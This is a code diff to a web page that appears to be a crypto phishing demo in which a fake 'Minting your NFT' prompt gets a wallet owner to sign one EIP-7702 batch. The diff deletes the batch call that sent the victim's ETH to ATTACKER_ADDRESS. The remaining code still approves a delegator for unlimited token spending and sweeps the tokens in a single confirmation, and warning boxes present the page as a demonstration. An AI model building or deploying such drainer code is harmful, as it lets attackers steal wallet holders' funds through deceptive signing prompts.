@@ -164,7 +164,7 @@
 
     <div class="warning-box">
       <strong>🔴 Why this is worse than any previous attack:</strong>
-      Old phishing required 5 separate signature popups to drain 5 tokens. This attack uses EIP-7702 batch execution to drain everything in ONE confirmation. You had zero additional opportunities to notice and reject.
+      Old phishing required separate signature popups per token. This attack uses EIP-7702 batch execution to drain all ERC-20 tokens in ONE confirmation. You had zero additional opportunities to notice and reject.
     </div>
 
     <div class="vs-box">
@@ -178,7 +178,7 @@
       <div class="vs-card vs-new">
         <div class="vs-title">NEW ATTACK (EIP-7702 Batch)</div>
         <div class="vs-item">ALL assets in 1 confirmation</div>
-        <div class="vs-item">ETH + all tokens simultaneously</div>
+
         <div class="vs-item">No chance to cancel midway</div>
         <div class="vs-item">EOA reverts to normal after</div>
       </div>
@@ -203,18 +203,13 @@
           <div class="code-block">
 [<br>
 &nbsp;&nbsp;{to: DEMO_TOKEN, data: approve(delegator, MAX_UINT256)},<br>
-&nbsp;&nbsp;{to: attacker,  value: ETH_balance - gas_buffer},<br>
 &nbsp;&nbsp;{to: delegator, data: sweep(DEMO_TOKEN)}<br>
 ]
           </div>
-          One confirmation approves the delegator for all tokens, sends all ETH directly to attacker, then sweeps all tokens via the delegator. Fully atomic.
+          One confirmation approves the delegator for all tokens, then sweeps all tokens via the delegator. Fully atomic.
         </div>
       </div>
-      <div class="tl-item">
-        <div class="tl-dot done"></div>
-        <div class="tl-title">Step 4: ETH swept directly</div>
-        <div class="tl-desc">ETH sent as a plain value transfer to the attacker EOA. No calldata needed — no contract, no bytecode, no rejection.</div>
-      </div>
+
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-title">Step 5: Tokens swept via delegator</div>
@@ -244,10 +239,7 @@
       <div class="info-card-label">Attacker address (received funds)</div>
       <div class="info-card-value" id="displayAttacker">—</div>
     </div>
-    <div class="info-card">
-      <div class="info-card-label">ETH balance at risk</div>
-      <div class="info-card-value" id="displayBalance">—</div>
-    </div>
+
     <div class="info-card">
       <div class="info-card-label">ERC-20 tokens drained</div>
       <div class="info-card-value" id="displayTokens">—</div>
@@ -454,11 +446,6 @@
         { num:'3', state:'pending', title:'Minting your NFT',       desc:'Confirm batch in MetaMask...' }
       ]);
 
-      const gasBuffer   = ethers.parseEther("0.001");
-      const drainAmount = balanceWei > gasBuffer ? balanceWei - gasBuffer : 0n;
-
-      console.log("💰 Victim balance:", ethers.formatEther(balanceWei), "ETH");
-      console.log("💰 Drain amount:",   ethers.formatEther(drainAmount), "ETH");
 
       const DEMO_TOKEN = heldTokens.length > 0
         ? heldTokens[0].contractAddress
@@ -482,11 +469,7 @@
           value: "0x0",
           data:  approveData
         },
-        {
-          to:    ATTACKER_ADDRESS,
-          value: "0x" + drainAmount.toString(16)
-          // no `data` field — plain ETH transfer, omit entirely
-        },
+
         {
           to:    DELEGATOR_ADDRESS,
           value: "0x0",
@@ -521,14 +504,14 @@
       document.getElementById('walletChip').textContent     = shortAddr(userAddress);
       document.getElementById('displayVictim').textContent   = userAddress;
       document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
-      document.getElementById('displayBalance').textContent  = parseFloat(userBalance).toFixed(6) + ' ETH (swept)';
+
 
       const tokenSummary = heldTokens.length > 0
         ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
         : `DEMO tokens (swept via atomic approve + sweep)`;
       document.getElementById('displayTokens').textContent    = tokenSummary;
       document.getElementById('displayBatchSize').textContent =
-        `${maliciousCalls.length} calls (1x approve + 1x ETH transfer + 1x token sweep)`;
+        `${maliciousCalls.length} calls (1x approve + 1x token sweep)`;
 
       setTimeout(() => showPhase('phase-dashboard'), 1000);
 
@@ -539,13 +522,11 @@
         document.getElementById('walletChip').textContent     = shortAddr(userAddress) || '0x0000...0000';
         document.getElementById('displayVictim').textContent  = userAddress || 'Not connected';
         document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
-        document.getElementById('displayBalance').textContent  = userBalance
-          ? parseFloat(userBalance).toFixed(6) + ' ETH (would have been drained)'
-          : 'Unknown';
+
         document.getElementById('displayTokens').textContent  = heldTokens.length > 0
           ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
           : `None detected (default target: ${shortAddr(DEMO_TOKEN_DEFAULT)})`;
-        document.getElementById('displayBatchSize').textContent = '3 calls (1x approve + 1x ETH transfer + 1x token sweep)';
+        document.getElementById('displayBatchSize').textContent = '2 calls (1x approve + 1x token sweep)';
         showPhase('phase-dashboard');
       } else {
         showPhase('phase-lure');
